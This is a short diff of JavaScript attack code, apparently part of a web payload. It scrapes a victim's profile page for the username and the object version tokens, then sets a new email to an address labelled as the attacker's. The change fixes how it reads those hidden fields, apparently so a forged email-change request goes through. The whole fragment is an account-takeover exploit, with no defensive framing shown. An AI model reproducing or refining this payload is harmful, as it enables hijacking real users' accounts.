@@ -23,8 +23,8 @@ xhr.onreadystatechange = function () {
             const o_middle_name =  doc.querySelector('input[name="o_middle_name"]')?.value || null;  
             const o_last_name =  doc.querySelector('input[name="o_last_name"]')?.value || null;  
             const username =  doc.querySelector('input[id="username"]')?.value || null;
-            const object_version_number =  doc.querySelector('input[id="object_version_number"]')?.value || null;
-            const email_object_version_number =  doc.querySelector('input[id="email_object_version_number"]')?.value || null;
+            const object_version_number =  doc.querySelector('input[name="object_version_number"]')?.value || null;
+            const email_object_version_number =  doc.querySelector('input[name="email_object_version_number"]')?.value || null;
             const newemail = "attacker.email123@gmail.com";// Enter new email
             const img = new Image();
 
